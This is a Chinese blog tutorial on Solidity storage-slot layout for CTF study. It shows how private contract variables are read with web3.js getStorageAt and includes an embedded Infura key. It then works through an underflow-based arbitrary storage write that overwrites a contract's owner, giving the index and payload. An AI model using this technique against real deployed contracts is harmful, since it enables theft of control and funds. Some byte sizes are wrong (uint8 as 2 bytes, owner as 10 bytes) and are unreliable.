# 插槽(slot)
静态大小的变量（除 映射mapping 和动态数组之外的所有类型）都从位置 0 开始连续放置在 存储storage 中。如果可能的话，存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中。

通俗的理解就相当于每个合约都有一个storage，静态大小的变量都会放在其中，从位置0开始，甚至可以举个不太恰当的例子，就是编程语言中的数组，每个数组元素可能就相当于静态变量，依次存在storage(类比数组)中，从索引0开始。但是和数组不同的是，solidity的静态变量放在storage的方式并不都是像数组那样从0开始然后1，一个一个这样排的。

> 以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽，其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。

对于值类型的存储规则（除去映射，动态数组，bytes和string）：

 - 存储插槽storage slot 的第一项会以低位对齐（即右对齐）的方式储存。
 - 基本类型仅使用存储它们所需的字节。
 - 如果 存储插槽storage slot 中的剩余空间不足以储存一个基本类型，那么它会被移入下一个 存储插槽storage slot 。
 - 结构体（struct）和数组数据总是会占用一整个新插槽（但结构体或数组中的各项，都会以这些规则进行打包）。

简单说，就是对于每一个这样的插槽：

```javascript
----------------------------------------------
|                                            |
|                                            |  这边是右边
|                                            |
----------------------------------------------
```
它是右对齐的，一个插槽是32个字节，比如存进一个uint8的变量，则2个字节：

```javascript
----------------------------------------------
|                                    | uint8 |
|                                    |  2字节 |  
|                                    |       |
----------------------------------------------
```
占据最右边的2个字节，还剩下左边的空着的30字节。如果接下来是还是一个uint8类型的变量，因为当前插槽还剩下的30字节可以容纳2字节，因此还会在当前插槽继续存：

```javascript
----------------------------------------------
|                            | uint8 | uint8 |
|                            |  2字节 |  2字节 |  
|                            |       |       |
----------------------------------------------
```
如果接下来要存的是个uint256变量，需要32个字节，当前插槽存不下，就要到下一个插槽：

```javascript
----------------------------------------------
|                            | uint8 | uint8 |
|                            |  2字节 |  2字节 |  
|                            |       |       |
----------------------------------------------
|                                            |
|                 uint256                    |  
|                                            |
----------------------------------------------
```
接下来引用ctfwiki的例子：

```javascript
pragma solidity ^0.4.0;

contract C {
    address a;      // 0
    uint8 b;        // 0
    uint256 c;      // 1
    bytes24 d;      // 2
}
```
依次从slot0开始存储，存储结果：

```javascript
-----------------------------------------------------
| unused (11) | b (1) |            a (20)           | <- slot 0
-----------------------------------------------------
|                       c (32)                      | <- slot 1
-----------------------------------------------------
| unused (8) |                d (24)                | <- slot 2
-----------------------------------------------------
```

# 映射和动态数组
官方文档是这么说的：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414194418460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
## 映射
比如，前面占用了slot0,slot1，接下来该从slot2开始，正好遇到了mapping。这时候，映射首先会占用一个插槽（在这里即是slot2，注意需要是未被填充的），这个插槽只是相当于一个占位，并没有什么用，但是却不能缺少它。接下来就是存储映射中的值。需要注意，映射的键是不存储的，因为是通过映射的键来找到映射的值在storage中的位置：

> 映射mapping 中的键 k 所对应的值会位于 keccak256(k . p) ， 其中 . 是连接符。如果该值又是一个非基本类型，则通过添加 keccak256(k . p) 作为偏移量来找到位置。

看个例子：

```javascript
pragma solidity ^0.6.0;

contract map {
    mapping(uint => uint) public feng;
    function ddd() public {
        feng[0] = 123;
    }
    
    function cal_addr(uint k, uint p) public pure returns(bytes32 res) {
        res = keccak256(abi.encodePacked(k, p));
    }

}
```
映射feng的那个必须的插槽在slot0，因此p为0。通过ddd函数，键为0的值的123。
注意这个：

```javascript
res = keccak256(abi.encodePacked(k, p));
```
这就是以后计算映射所在的位置的一种很好的方法：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414195855677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
算到是`0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5`，再拿web3.js读一下（这个访问控制接下来也会提到）：

```javascript
const Web3 = require('web3');
const rpcURL = "https://rinkeby.infura.io/v3/2ab0c9f096474b2a8b7b60a25ded6c21";
const web3 = new Web3(rpcURL);


const address = "0x5b57Eff9aC56d6Ffb88502Ce3d9a1FF43A259328"

web3.eth.getStorageAt(address,"0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5",function(x,y){console.info(y);});
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414195950305.png)
hex解码得到123，说明我们计算的地址值是正确的。


## 动态数组
和映射有些类似，只不过是首先占据一个插槽，和映射那样只是占据但是没什么用不同，这个插槽里是动态数组的长度，然后数组的元素位于：

```javascript
keccak256(p)
keccak256(p)+1
keccak256(p)+2
keccak256(p)+3
.............
```
看个例子：

```javascript
pragma solidity ^0.6.0;

contract map {
    uint[] public feng;
    function ddd() public {
        feng.push(123);
    }
   
    function cal_addr(uint p) public pure returns(uint res1,bytes32 res2) {
        res1 = uint(keccak256(abi.encodePacked(p)));
        res2 = keccak256(abi.encodePacked(p));
    }
}
```
和上面一样，算出地址：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414202348504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
用10进制和十六进制在getStorageAt都可：

```javascript
const Web3 = require('web3');
const rpcURL = "https://rinkeby.infura.io/v3/2ab0c9f096474b2a8b7b60a25ded6c21";
const web3 = new Web3(rpcURL);


const address = "0xc4953C978c8339d62730B602E1Fbe46CFddC9f02"

web3.eth.getStorageAt(address,"18569430475105882587588266137607568536673111973893317399460219858819262702947",function(x,y){console.info(y);});
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414202419603.png)
同样的。

# 字节数组和字符串（bytes和string）

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414202541893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)
官方文档也给了存储的方式和计算方式，这里不再给出例子。

# 可见性
合约中变量的可见性问题，简单来说就是可能会把一些比较关键私密的数据设置成private，这种不可见只是相对于合约来说的，对于合约外部仍然可以读取，只要知道了它在storage中的位置，这也就是为什么要知道值类型和映射，动态数组之类在storage中的存储方式和计算存储的slot值，就像上面的例子中最后读取的那样，用web3.js就可以成功读到storage中的值。这样就可以获取到private的量，进行一些攻击。具体例子不再给出，因为很多题目都涉及到了。

# Arbitrary Writing

> 在以太坊 EVM 的设计思路中，所有的 Storage 变量共用一片大小为 2^256*32 字节的存储空间，没有各自的存储区域划分。
> 
> Storage 空间即使很大也是有限大小，当变长数组长度很大时，考虑极端情况，如果长度达到 2^256，则可对任意 Storage
> 变量进行读写操作，这是非常可怕的。

因此，如果变长数组是可控的话，相当于可以覆盖storage中的任意量。

看一下ctfwiki的一个例子，try to be owner：

```javascript
pragma solidity ^0.4.24;

contract ArrayTest  {

    address public owner;
    bool public contact;
    bytes32[] public codex;

    constructor() public {
        owner = msg.sender;
    }

    function record(bytes32 _content) public {
        codex.push(_content);
    }

    function retract() public {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public {
        codex[i] = _content;
    }
}
```
利用的知识点有整形溢出和Storage的write。
动态bytes数组codex的length一开始为0，因此retract函数对其--，导致可整形下溢出，它的length变的特别大，足以覆盖整个storage。
再看`revise()`函数，往整个动态数组中写东西，联想到计算公式：

```javascript
keccak256(p)
keccak256(p)+1
keccak256(p)+2
keccak256(p)+3
...........
```
我们目前知道，owner在slot0，contact也在slot0，codex的长度在slot1，因此p为1，因此`codex[i]`就在`keccak256(1)+i`。这里又要用到整形溢出了，因此要覆盖slot0，而一开始的`keccak256(1)`肯定是比0大的，因此就要靠i，去再次溢出uint256，从而让值`keccak256(1)+i`为0。

因此要算出这个i，让这个i是键：

```javascript
contract Feng {
    bytes32 public a1 = keccak256(1); 
    bytes32 public a2 = keccak256("1");          
    bytes32 public a3 = keccak256(bytes32(1));  //true
    bytes32 public a4 = keccak256(uint(1));  //true
    bytes32 public f1= keccak256(abi.encodePacked(1)); 
    bytes32 public f2= keccak256(abi.encodePacked("1")); 
    bytes32 public f3= keccak256(abi.encodePacked(bytes32(1))); //true
    bytes32 public f4= keccak256(abi.encodePacked(uint(1))); //true
    uint public result = 2**256-1 - uint(f4) +1;
}
```
这个是我一开始就踩了坑的地方，注意算的时候，p的类型一定要是uint或者bytes32，否则算出来的就是错的，映射也同理。

算出来是`35707666377435648211887908874984608119992236509074197713628505308453184860938`
然后设置传revise函数即可：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414204932642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70)

```javascript
35707666377435648211887908874984608119992236509074197713628505308453184860938
0x0000000000000000000000017D11f36fA2FD9B7A4069650Cd8A2873999263FB8
```
因为slot0的后10字节是owner，从右往左数第十一字节是contact。



